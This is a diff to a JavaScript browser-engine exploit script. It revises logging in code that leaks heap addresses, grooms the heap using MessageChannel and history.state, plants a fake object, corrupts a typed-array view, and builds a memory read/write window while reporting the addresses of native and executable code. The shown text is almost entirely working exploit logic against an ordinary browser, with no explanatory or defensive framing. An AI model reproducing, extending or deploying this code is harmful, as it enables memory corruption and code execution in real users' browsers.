@@ -164,9 +164,9 @@ function encodedHeaderNumber() {
   return number[0];
 }
 
-function emit(tag, detail) {
+function emit(tag, detail, type) {
   if (onEvent !== null)
-    onEvent(tag, detail === undefined ? "" : String(detail));
+    onEvent(tag, detail === undefined ? "" : String(detail), type);
 }
 
 function isOurCorruptedView(candidate, originalVector) {
@@ -380,7 +380,6 @@ function prepareAddressLeak() {
   getterCarrier[2] = fakeHost;
   getterCarrier[3] = targetHolder;
   preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
-  emit("Preparing address leak", `${CARRIER_SLOTS} slots`);
 
   setTimeout(captureAddresses, CAPTURE_DELAY_MS);
   setTimeout(finishAddressLeak, COMPOSE_DELAY_MS);
@@ -630,7 +629,13 @@ function inspectClonedGraph(holderAddress) {
 
     liveCandidate = candidate;
     clearPointerSpray();
-    return { status: "ready", originalVector, nativeInfo };
+    return {
+      status: "ready",
+      originalVector,
+      functionAddress: nativeTargetAddress,
+      executableAddress: functionInfo.executable,
+      nativeInfo,
+    };
   } catch (error) {
     const safe =
       candidate === null &&
@@ -660,7 +665,6 @@ function inspectClonedGraph(holderAddress) {
 
 // Stage 3: create the required holes, spray fakeHost, then run history.state.
 function groomHeap(fakeAddress, holderAddress) {
-  emit("Heap grooming", `${DRAIN_COUNT} buffers`);
   let outcome;
   try {
     const channel = new MessageChannel();
@@ -702,7 +706,7 @@ function groomHeap(fakeAddress, holderAddress) {
     } catch {}
     outcome = { status: "error", safe: true, error };
   }
-  finishAttempt(outcome, holderAddress);
+  finishAttempt(outcome, holderAddress, fakeAddress);
 }
 
 function prepareCriticalLoadBarrier() {
@@ -757,15 +761,11 @@ function finishAddressLeak() {
   const fakeAddress = hostAddress + 0x10;
   if (!plausibleCell(fakeAddress))
     return finishEarlySafeAttempt("invalid fake object address", hex(hostAddress));
-  emit(
-    "Address leak",
-    `host=${hex(hostAddress)} holder=${hex(holderAddress)} fake=${hex(fakeAddress)}`,
-  );
   groomHeap(fakeAddress, holderAddress);
 }
 
 // Stage 5: retry placement misses or publish the validated memory window.
-function finishAttempt(outcome, holderAddress) {
+function finishAttempt(outcome, holderAddress, fakeAddress) {
   if (outcome.status === "error") {
     emit("Failed", String(outcome.error?.message || outcome.error));
     return retry("heap placement failed", outcome.safe);
@@ -783,9 +783,6 @@ function finishAttempt(outcome, holderAddress) {
     return retry("memory window validation failed", false);
   }
 
-  emit("Corrupted view", `vector=${hex(outcome.originalVector)} holder=${hex(holderAddress)}`);
-  emit("Native pointers", `function=${hex(outcome.nativeInfo.nativeFunction)} constructor=${hex(outcome.nativeInfo.nativeConstructor)}`);
-
   try {
     history.replaceState(null, "");
   } catch {}
@@ -793,6 +790,16 @@ function finishAttempt(outcome, holderAddress) {
   const resolve = settleResolve;
   settleResolve = null;
   if (resolve !== null) resolve(createMemoryWindow(holderAddress));
+
+  emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "info");
+  emit("host_addr", hex(fakeAddress - 0x10), "info");
+  emit("holder_addr", hex(holderAddress), "info");
+  emit("fake_addr", hex(fakeAddress), "info");
+  emit("view_vector", hex(outcome.originalVector), "info");
+  emit("function_addr", hex(outcome.functionAddress), "info");
+  emit("executable_addr", hex(outcome.executableAddress), "info");
+  emit("native_function", hex(outcome.nativeInfo.nativeFunction), "info");
+  emit("native_constructor", hex(outcome.nativeInfo.nativeConstructor), "info");
 }
 
 function createMemoryWindow(holderAddress) {
